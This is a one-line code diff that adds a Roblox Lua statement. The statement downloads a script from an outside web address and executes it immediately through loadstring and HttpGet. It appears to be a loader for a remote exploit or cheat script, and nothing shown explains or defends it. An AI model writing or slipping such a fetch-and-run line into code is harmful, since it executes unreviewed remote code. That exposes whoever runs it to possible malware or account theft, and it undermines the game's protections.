@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://kyouko.se/55o4m9a2bwqg.lua'))()
